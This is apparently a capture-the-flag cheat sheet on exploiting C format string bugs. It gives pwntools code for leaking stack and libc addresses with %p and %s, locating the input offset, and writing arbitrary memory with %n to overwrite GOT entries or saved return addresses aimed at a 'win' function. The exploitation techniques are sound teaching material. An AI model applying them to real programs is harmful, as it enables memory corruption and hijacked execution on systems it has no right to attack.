# Format String

**When:** User input is passed directly as the format argument to `printf`, `sprintf`, `snprintf`, `fprintf`, etc. This gives you arbitrary read (via `%p`, `%s`) and arbitrary write (via `%n`).

```c
printf(user_input);  // bug: should be printf("%s", user_input)
```

## Recon

Test if format string is exploitable by sending markers:

```text
AAAA%p.%p.%p.%p.%p       # leak stack values (look for 0x41414141)
%s                        # will crash if first stack entry is a bad pointer
```

Scan for which offset contains your input:

```python
for i in range(1, 50):
    io = process('./chall')
    io.sendline(f'%{i}$p'.encode())
    print(i, io.recvline(timeout=0.2))
    io.close()
```

## Find Offset

Send a marker and find where it appears in the leaked output:

```python
for off in range(1, 30):
    io = process('./chall')
    marker = 0x4141414242424343
    io.sendline(flat(f'%{off}$p----'.encode(), marker))
    out = io.recvrepeat(0.2)
    if b'41414142' in out or b'42424243' in out:
        print('offset', off, out)
    io.close()
```

Or use pwntools auto-finder (only works if you have a way to send/receive):

```python
autofmt = FmtStr(lambda p: exec_fmt(p))
offset = autofmt.offset
```

## Arbitrary Read

Put the address after the format string (to avoid null bytes in the address breaking `printf`), and reference it by the positional parameter you found:

```python
def read_at(addr, fmt_off):
    payload = flat(f'%{fmt_off}$s.END'.encode(), addr)
    io.sendline(payload)
    return io.recvuntil(b'.END', drop=True)
```

Common candidates: `e.got['puts']` (to leak libc), `libc.sym['environ']` (to leak stack), return addresses on stack.

## Arbitrary Write (%n)

**How it works:** `%n` writes the count of bytes printed so far to a pointer on the stack. Using positional format (`%<pos>$n`), you can write to any address on the stack.

For partial RELRO, overwrite a GOT entry. For full RELRO, overwrite a saved return address on the stack.

```python
# GOT overwrite with pwntools (easiest)
payload = fmtstr_payload(offset, {e.got['printf']: e.symbols['win']}, write_size='short')
io.sendline(payload)

# Overwrite saved RIP (need stack leak for its address)
payload = fmtstr_payload(offset, {saved_rip: e.symbols['win']}, write_size='short')

# Partial overwrite (only modify lower 2 bytes, faster)
payload = fmtstr_payload(offset, {target: win & 0xffff}, write_size='short')
```

**write_size options:**

- `'byte'` - `%hhn` (writes 1 byte, 4 passes for 4 bytes)
- `'short'` - `%hn` (writes 2 bytes, 2 passes)
- `'int'` - `%n` (writes 4 bytes, 1 pass)

`short` is a good balance of speed vs payload size.

## Common Leak Offsets

These vary by binary, but common offsets for libc leaks:

```python
io.sendline(b'%13$p')
leak = int(io.recvline().strip(), 16)
libc.address = leak - LIBC_RET_OFFSET  # depends on libc

# Alternative common offsets to try:
# %3$p  %5$p  %7$p  %9$p  %11$p  %13$p  %15$p  %17$p  %21$p
```
